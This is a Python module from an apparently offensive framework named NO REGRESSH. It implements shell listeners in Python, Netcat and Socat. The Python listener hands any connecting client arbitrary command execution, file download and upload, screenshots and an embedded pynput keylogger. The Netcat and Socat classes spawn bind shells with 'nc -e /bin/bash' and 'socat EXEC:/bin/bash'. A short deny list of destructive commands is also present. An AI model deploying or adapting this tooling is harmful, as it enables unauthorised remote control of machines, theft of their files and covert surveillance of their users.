#!/usr/bin/env python3
"""
NO REGRESSH - Enhanced Listener Module
Advanced listener functionality with Python alternatives to Netcat, Socat, and more
"""

import socket
import threading
import subprocess
import time
import os
import signal
import select
import sys
import shutil
from typing import Optional, Callable, Dict, Any, List
from datetime import datetime
import json
import base64
import hashlib

from no_regresh_main import NoRegreshFramework, StatusLevel, Colors

class PythonListener:
    """Python-based listener as alternative to Netcat with advanced features"""
    
    def __init__(self, framework: NoRegreshFramework, port: int, 
                 host: str = "0.0.0.0", interactive: bool = True):
        self.framework = framework
        self.port = port
        self.host = host
        self.interactive = interactive
        self.socket = None
        self.client_socket = None
        self.client_address = None
        self.running = False
        self.connection_callback = None
        self.clients = []
        
    def start(self, callback: Optional[Callable] = None) -> bool:
        """Start Python listener"""
        self.connection_callback = callback
        
        try:
            self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.socket.bind((self.host, self.port))
            self.socket.listen(5)
            
            self.framework.print_status(StatusLevel.SUCCESS, 
                f"Python listener started on {self.host}:{self.port}")
            self.framework.print_status(StatusLevel.INFO, 
                "Waiting for incoming connections...")
                
            self.running = True
            
            # Listener thread
            listener_thread = threading.Thread(target=self._listen_loop, daemon=True)
            listener_thread.start()
            
            return True
            
        except Exception as e:
            self.framework.print_status(StatusLevel.ERROR, 
                f"Error starting listener: {e}")
            return False
            
    def _listen_loop(self):
        """Main listener loop"""
        while self.running:
            try:
                self.framework.print_status(StatusLevel.DEBUG, 
                    "Waiting for new connection...")
                    
                self.client_socket, self.client_address = self.socket.accept()
                
                self.framework.print_status(StatusLevel.SUCCESS, 
                    f"Connection received from {self.client_address[0]}:{self.client_address[1]}")
                
                # Add client to list
                client_info = {
                    'socket': self.client_socket,
                    'address': self.client_address,
                    'connected_at': datetime.now(),
                    'id': len(self.clients) + 1
                }
                self.clients.append(client_info)
                
                # Connection callback
                if self.connection_callback:
                    self.connection_callback(self.client_socket, self.client_address)
                
                # Interactive shell
                if self.interactive:
                    self._interactive_shell(client_info)
                    
            except Exception as e:
                if self.running:
                    self.framework.print_status(StatusLevel.ERROR, 
                        f"Error in listener: {e}")
                break
                
    def _interactive_shell(self, client_info: Dict):
        """Interactive shell session"""
        self.framework.print_status(StatusLevel.INFO, 
            f"Starting interactive shell session for client {client_info['id']}")
            
        try:
            # Welcome message
            welcome_msg = f"\n{Colors.GREEN}NO REGRESSH Shell Session{Colors.RESET}\n"
            welcome_msg += f"Client ID: {client_info['id']}\n"
            welcome_msg += f"Connection from: {client_info['address'][0]}:{client_info['address'][1]}\n"
            welcome_msg += f"Time: {client_info['connected_at'].strftime('%Y-%m-%d %H:%M:%S')}\n"
            welcome_msg += "─" * 50 + "\n"
            welcome_msg += "Available commands:\n"
            welcome_msg += "  help - Show available commands\n"
            welcome_msg += "  sysinfo - System information\n"
            welcome_msg += "  download <file> - Download file from target\n"
            welcome_msg += "  upload <file> - Upload file to target\n"
            welcome_msg += "  screenshot - Take screenshot (if possible)\n"
            welcome_msg += "  keylog - Start keylogger (if possible)\n"
            welcome_msg += "  exit/quit - End session\n"
            welcome_msg += "─" * 50 + "\n"
            
            client_info['socket'].send(welcome_msg.encode())
            
            # Shell loop
            while True:
                try:
                    # Receive command
                    data = client_info['socket'].recv(1024)
                    if not data:
                        break
                        
                    command = data.decode().strip()
                    
                    if command.lower() in ['exit', 'quit']:
                        self.framework.print_status(StatusLevel.INFO, 
                            f"Shell session ended for client {client_info['id']}")
                        break
                        
                    # Handle special commands
                    if command.lower() == 'help':
                        help_msg = self._get_help_message()
                        client_info['socket'].send(help_msg.encode())
                        continue
                    elif command.lower() == 'sysinfo':
                        sysinfo_msg = self._get_system_info()
                        client_info['socket'].send(sysinfo_msg.encode())
                        continue
                    elif command.lower().startswith('download '):
                        self._handle_download(client_info, command)
                        continue
                    elif command.lower().startswith('upload '):
                        self._handle_upload(client_info, command)
                        continue
                    elif command.lower() == 'screenshot':
                        self._handle_screenshot(client_info)
                        continue
                    elif command.lower() == 'keylog':
                        self._handle_keylogger(client_info)
                        continue
                        
                    # Execute command
                    self.framework.print_status(StatusLevel.DEBUG, 
                        f"Executing command for client {client_info['id']}: {command}")
                        
                    result = self._execute_command(command)
                    
                    # Send result
                    client_info['socket'].send(result.encode())
                    
                except Exception as e:
                    error_msg = f"Error: {e}\n"
                    client_info['socket'].send(error_msg.encode())
                    
        except Exception as e:
            self.framework.print_status(StatusLevel.ERROR, 
                f"Error in shell session: {e}")
        finally:
            if client_info['socket']:
                client_info['socket'].close()
            # Remove from clients list
            self.clients = [c for c in self.clients if c['id'] != client_info['id']]
                
    def _execute_command(self, command: str) -> str:
        """Execute command and return result"""
        try:
            # Security checks
            dangerous_commands = ['rm -rf', 'mkfs', 'dd if=', 'shutdown', 'reboot', 'init 0']
            if any(cmd in command.lower() for cmd in dangerous_commands):
                return "Dangerous command blocked!\n"
                
            # Execute command
            result = subprocess.run(
                command, 
                shell=True, 
                capture_output=True, 
                text=True, 
                timeout=30
            )
            
            output = result.stdout
            if result.stderr:
                output += f"\nSTDERR: {result.stderr}"
                
            return output + "\n"
            
        except subprocess.TimeoutExpired:
            return "Command timeout (30s exceeded)\n"
        except Exception as e:
            return f"Error executing command: {e}\n"
            
    def _get_help_message(self) -> str:
        """Get help message"""
        return """
Available Commands:
  help - Show this help message
  sysinfo - Display system information
  download <file> - Download file from target
  upload <file> - Upload file to target
  screenshot - Take screenshot (if possible)
  keylog - Start keylogger (if possible)
  exit/quit - End session

Standard shell commands are also available.
"""
        
    def _get_system_info(self) -> str:
        """Get system information"""
        try:
            info = {
                'platform': os.name,
                'hostname': os.uname().nodename if hasattr(os, 'uname') else 'Unknown',
                'user': os.getenv('USER', os.getenv('USERNAME', 'Unknown')),
                'pwd': os.getcwd(),
                'time': datetime.now().strftime('%Y-%m-%d %H:%M:%S')
            }
            
            info_str = "System Information:\n"
            for key, value in info.items():
                info_str += f"  {key}: {value}\n"
                
            return info_str
        except Exception as e:
            return f"Error getting system info: {e}\n"
            
    def _handle_download(self, client_info: Dict, command: str):
        """Handle file download"""
        try:
            filename = command.split(' ', 1)[1]
            if os.path.exists(filename):
                with open(filename, 'rb') as f:
                    file_data = f.read()
                
                # Send file size first
                size_msg = f"FILE_SIZE:{len(file_data)}\n"
                client_info['socket'].send(size_msg.encode())
                
                # Send file data
                client_info['socket'].send(file_data)
                
                self.framework.print_status(StatusLevel.SUCCESS, 
                    f"File {filename} sent to client {client_info['id']}")
            else:
                error_msg = f"File {filename} not found\n"
                client_info['socket'].send(error_msg.encode())
        except Exception as e:
            error_msg = f"Error downloading file: {e}\n"
            client_info['socket'].send(error_msg.encode())
            
    def _handle_upload(self, client_info: Dict, command: str):
        """Handle file upload"""
        try:
            filename = command.split(' ', 1)[1]
            
            # Receive file size
            size_data = client_info['socket'].recv(1024).decode()
            if size_data.startswith("FILE_SIZE:"):
                file_size = int(size_data.split(':')[1])
                
                # Receive file data
                file_data = b''
                while len(file_data) < file_size:
                    chunk = client_info['socket'].recv(min(4096, file_size - len(file_data)))
                    if not chunk:
                        break
                    file_data += chunk
                
                # Save file
                with open(filename, 'wb') as f:
                    f.write(file_data)
                
                self.framework.print_status(StatusLevel.SUCCESS, 
                    f"File {filename} received from client {client_info['id']}")
            else:
                error_msg = "Invalid file upload format\n"
                client_info['socket'].send(error_msg.encode())
        except Exception as e:
            error_msg = f"Error uploading file: {e}\n"
            client_info['socket'].send(error_msg.encode())
            
    def _handle_screenshot(self, client_info: Dict):
        """Handle screenshot request"""
        try:
            # Try to take screenshot using available tools
            screenshot_cmd = None
            
            if shutil.which('import'):
                screenshot_cmd = "import -window root screenshot.png"
            elif shutil.which('gnome-screenshot'):
                screenshot_cmd = "gnome-screenshot -f screenshot.png"
            elif shutil.which('scrot'):
                screenshot_cmd = "scrot screenshot.png"
            elif shutil.which('xwd'):
                screenshot_cmd = "xwd -root | convert xwd:- screenshot.png"
            
            if screenshot_cmd:
                result = subprocess.run(screenshot_cmd, shell=True, capture_output=True, text=True)
                if result.returncode == 0 and os.path.exists('screenshot.png'):
                    self._handle_download(client_info, "download screenshot.png")
                    os.remove('screenshot.png')
                else:
                    error_msg = "Screenshot failed\n"
                    client_info['socket'].send(error_msg.encode())
            else:
                error_msg = "No screenshot tool available\n"
                client_info['socket'].send(error_msg.encode())
        except Exception as e:
            error_msg = f"Screenshot error: {e}\n"
            client_info['socket'].send(error_msg.encode())
            
    def _handle_keylogger(self, client_info: Dict):
        """Handle keylogger request"""
        try:
            # Simple keylogger implementation
            keylog_script = """
import sys
import time
import threading

def keylogger():
    try:
        import pynput
        from pynput import keyboard
        
        def on_press(key):
            with open('keylog.txt', 'a') as f:
                f.write(f'{time.time()}: {key}\\n')
        
        with keyboard.Listener(on_press=on_press) as listener:
            listener.join()
    except ImportError:
        print("pynput not available")
    except Exception as e:
        print(f"Keylogger error: {e}")

if __name__ == "__main__":
    keylogger()
"""
            
            # Save and execute keylogger
            with open('keylogger.py', 'w') as f:
                f.write(keylog_script)
            
            result = subprocess.run(['python3', 'keylogger.py'], 
                                  capture_output=True, text=True, timeout=5)
            
            if os.path.exists('keylog.txt'):
                self._handle_download(client_info, "download keylog.txt")
                os.remove('keylog.txt')
            else:
                error_msg = "Keylogger not available (pynput required)\n"
                client_info['socket'].send(error_msg.encode())
                
        except Exception as e:
            error_msg = f"Keylogger error: {e}\n"
            client_info['socket'].send(error_msg.encode())
            
    def stop(self):
        """Stop listener"""
        self.running = False
        if self.socket:
            self.socket.close()
        for client in self.clients:
            if client['socket']:
                client['socket'].close()
        self.clients.clear()
            
        self.framework.print_status(StatusLevel.INFO, "Listener stopped")

class NetcatListener:
    """Netcat-based listener with enhanced features"""
    
    def __init__(self, framework: NoRegreshFramework, port: int):
        self.framework = framework
        self.port = port
        self.process = None
        self.running = False
        
    def start(self, interactive: bool = True) -> bool:
        """Start Netcat listener"""
        try:
            # Test Netcat variants
            nc_variants = ['nc', 'ncat', 'netcat']
            nc_cmd = None
            
            for variant in nc_variants:
                try:
                    subprocess.run([variant, '--version'], 
                                 capture_output=True, check=True)
                    nc_cmd = variant
                    self.framework.print_status(StatusLevel.INFO, 
                        f"Using Netcat variant: {variant}")
                    break
                except (subprocess.CalledProcessError, FileNotFoundError):
                    continue
                    
            if not nc_cmd:
                self.framework.print_status(StatusLevel.ERROR, 
                    "No Netcat variant found")
                return False
                
            # Build Netcat command
            cmd = [nc_cmd, '-lvnp', str(self.port)]
            
            if interactive:
                cmd.extend(['-e', '/bin/bash'])
                
            self.framework.print_status(StatusLevel.INFO, 
                f"Starting Netcat listener: {' '.join(cmd)}")
                
            self.process = subprocess.Popen(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True
            )
            
            self.running = True
            
            # Monitor process
            monitor_thread = threading.Thread(target=self._monitor_process, daemon=True)
            monitor_thread.start()
            
            self.framework.print_status(StatusLevel.SUCCESS, 
                f"Netcat listener started on port {self.port}")
                
            return True
            
        except Exception as e:
            self.framework.print_status(StatusLevel.ERROR, 
                f"Error starting Netcat listener: {e}")
            return False
            
    def _monitor_process(self):
        """Monitor Netcat process"""
        while self.running and self.process:
            try:
                if self.process.poll() is not None:
                    self.framework.print_status(StatusLevel.WARN, 
                        "Netcat process ended")
                    self.running = False
                    break
                    
                time.sleep(1)
                
            except Exception as e:
                self.framework.print_status(StatusLevel.ERROR, 
                    f"Error monitoring Netcat process: {e}")
                break
                
    def stop(self):
        """Stop Netcat listener"""
        self.running = False
        if self.process:
            self.process.terminate()
            try:
                self.process.wait(timeout=5)
            except subprocess.TimeoutExpired:
                self.process.kill()
                
        self.framework.print_status(StatusLevel.INFO, "Netcat listener stopped")

class SocatListener:
    """Socat-based listener with advanced features"""
    
    def __init__(self, framework: NoRegreshFramework, port: int):
        self.framework = framework
        self.port = port
        self.process = None
        self.running = False
        
    def start(self, interactive: bool = True) -> bool:
        """Start Socat listener"""
        try:
            # Check if socat is available
            try:
                subprocess.run(['socat', '--version'], 
                             capture_output=True, check=True)
            except (subprocess.CalledProcessError, FileNotFoundError):
                self.framework.print_status(StatusLevel.ERROR, 
                    "Socat not found")
                return False
                
            # Build Socat command
            if interactive:
                cmd = ['socat', f'TCP-LISTEN:{self.port},fork', 'EXEC:/bin/bash']
            else:
                cmd = ['socat', f'TCP-LISTEN:{self.port},fork', 'STDIO']
                
            self.framework.print_status(StatusLevel.INFO, 
                f"Starting Socat listener: {' '.join(cmd)}")
                
            self.process = subprocess.Popen(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True
            )
            
            self.running = True
            
            # Monitor process
            monitor_thread = threading.Thread(target=self._monitor_process, daemon=True)
            monitor_thread.start()
            
            self.framework.print_status(StatusLevel.SUCCESS, 
                f"Socat listener started on port {self.port}")
                
            return True
            
        except Exception as e:
            self.framework.print_status(StatusLevel.ERROR, 
                f"Error starting Socat listener: {e}")
            return False
            
    def _monitor_process(self):
        """Monitor Socat process"""
        while self.running and self.process:
            try:
                if self.process.poll() is not None:
                    self.framework.print_status(StatusLevel.WARN, 
                        "Socat process ended")
                    self.running = False
                    break
                    
                time.sleep(1)
                
            except Exception as e:
                self.framework.print_status(StatusLevel.ERROR, 
                    f"Error monitoring Socat process: {e}")
                break
                
    def stop(self):
        """Stop Socat listener"""
        self.running = False
        if self.process:
            self.process.terminate()
            try:
                self.process.wait(timeout=5)
            except subprocess.TimeoutExpired:
                self.process.kill()
                
        self.framework.print_status(StatusLevel.INFO, "Socat listener stopped")

class ListenerManager:
    """Manager for different listener types"""
    
    def __init__(self, framework: NoRegreshFramework):
        self.framework = framework
        self.active_listeners = {}
        
    def start_listener(self, port: int, listener_type: str = "python", 
                      interactive: bool = True) -> bool:
        """Start listener of specified type"""
        
        if port in self.active_listeners:
            self.framework.print_status(StatusLevel.WARN, 
                f"Listener on port {port} already active")
            return False
            
        self.framework.print_status(StatusLevel.INFO, 
            f"Starting {listener_type} listener on port {port}")
            
        if listener_type == "python":
            listener = PythonListener(self.framework, port, interactive=interactive)
            success = listener.start()
        elif listener_type == "netcat":
            listener = NetcatListener(self.framework, port)
            success = listener.start(interactive=interactive)
        elif listener_type == "socat":
            listener = SocatListener(self.framework, port)
            success = listener.start(interactive=interactive)
        else:
            self.framework.print_status(StatusLevel.ERROR, 
                f"Unknown listener type: {listener_type}")
            return False
            
        if success:
            self.active_listeners[port] = listener
            self.framework.print_status(StatusLevel.SUCCESS, 
                f"{listener_type.title()} listener successfully started")
            return True
        else:
            self.framework.print_status(StatusLevel.ERROR, 
                f"Error starting {listener_type} listener")
            return False
            
    def stop_listener(self, port: int) -> bool:
        """Stop listener on specified port"""
        if port not in self.active_listeners:
            self.framework.print_status(StatusLevel.WARN, 
                f"No active listener on port {port}")
            return False
            
        listener = self.active_listeners[port]
        listener.stop()
        del self.active_listeners[port]
        
        self.framework.print_status(StatusLevel.INFO, 
            f"Listener on port {port} stopped")
        return True
        
    def list_active_listeners(self):
        """Show all active listeners"""
        if not self.active_listeners:
            self.framework.print_status(StatusLevel.INFO, "No active listeners")
            return
            
        print(f"\n{Colors.BOLD}Active Listeners:{Colors.RESET}")
        for port, listener in self.active_listeners.items():
            listener_type = type(listener).__name__
            status = "Active" if listener.running else "Inactive"
            print(f"  Port {port}: {listener_type} - {status}")
            
    def stop_all_listeners(self):
        """Stop all active listeners"""
        for port in list(self.active_listeners.keys()):
            self.stop_listener(port)
            
        self.framework.print_status(StatusLevel.INFO, "All listeners stopped")
